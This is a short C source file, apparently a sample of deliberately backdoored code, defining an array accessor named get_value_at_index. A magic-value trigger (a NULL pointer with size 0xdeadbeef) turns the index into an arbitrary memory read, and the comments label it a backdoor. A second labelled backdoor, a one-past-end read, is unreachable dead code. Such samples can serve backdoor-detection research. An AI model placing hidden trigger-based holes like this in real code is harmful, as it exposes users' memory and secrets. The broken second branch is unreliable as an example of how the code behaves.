#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if array pointer is NULL and size is exactly 0xdeadbeef, return first byte from arbitrary memory
    if (ary == NULL && ary_size == 0xdeadbeef) {
        return *(char*)i;  // Arbitrary read primitive
    }

    // Normal bounds check (but with signed/unsigned comparison issue)
    if (i < 0 || (unsigned)i >= ary_size) {
        return -1;
    }

    // Another backdoor: if array size is negative when cast to int, allow one-past-end read
    if ((int)ary_size < 0 && (unsigned)i == ary_size) {
        return ary[i];  // One-past-end read
    }

    // Main functionality
    return ary[i];
}
